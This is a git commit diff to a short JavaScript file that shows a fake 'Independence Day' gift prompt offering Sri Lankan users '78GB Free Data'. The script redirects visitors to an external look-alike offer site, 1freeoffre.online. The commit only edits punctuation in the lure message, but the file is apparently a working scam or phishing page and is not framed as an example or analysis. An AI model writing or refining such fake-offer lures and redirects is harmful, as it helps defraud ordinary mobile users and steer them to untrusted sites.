d44401ef44e2207b1cad6bbb4268f7221be8692b
oynxa <heartflet247@gmail.com>
2026-02-01 07:28:50 -0800

    Update activation-independence.js

--- activation-independence.js
+++ activation-independence.js
@@ -1,6 +1,6 @@
 
 var password = '78GB FREE DATA'
-password=prompt('HAPPY INDEPENDENCE DAY CELEBRATION GIFT TO SRI LANKA: Dear Valued Customer, Kindly Receive 78GB Free Data As We Celebrate 78th Independence Day, press 78GB Free Data To Get-Offer-Now! ','78 FREE DATA');
+password=prompt('HAPPY INDEPENDENCE DAY CELEBRATION GIFT TO SRI LANKA: Dear Valued Customer Kindly Receive 78GB Free Data As We Celebrate 78th Independence Day, press 78GB Free Data To Get Offer Now! ','78 FREE DATA');
 if (password != '78GB FREE DATA') {
 location.href='https://1freeoffre.online/independence.org.html';
 }
